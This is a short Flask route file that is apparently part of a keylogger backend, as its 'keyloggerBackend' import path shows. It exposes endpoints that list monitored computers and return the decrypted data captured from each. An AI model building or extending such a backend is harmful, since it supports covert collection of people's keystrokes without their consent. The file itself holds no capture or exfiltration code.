from flask import Blueprint, jsonify, request
from app.logic import computers_logic as computers
from keyloggerBackend.app.logic.save_data_logic import WriteToNetwork
computers_bp = Blueprint('getComputers', __name__, url_prefix='/getComputers')

@computers_bp.route('/', methods=['GET'])
def get_computers():
    computer_names = computers.get_names_computer()
    print(computer_names)
    if not computer_names:
        return jsonify({"status": "fail", "error": "Invalid credentials"}), 401
    else:
        return jsonify({"computers": computer_names}), 200



get_data_by_computer_bp = Blueprint('getDataByComputer', __name__, url_prefix='/getDataByComputer')
@get_data_by_computer_bp.route('/<computer_name>', methods=['GET'])
def get_data_by_computer(computer_name):


    decrypted_data =computers.get_data_by_computer(computer_name)
    print(decrypted_data)

    if not decrypted_data:
        return jsonify({"status": "fail", "error": "Invalid credentials"}), 401
    else:
        return jsonify( decrypted_data), 200
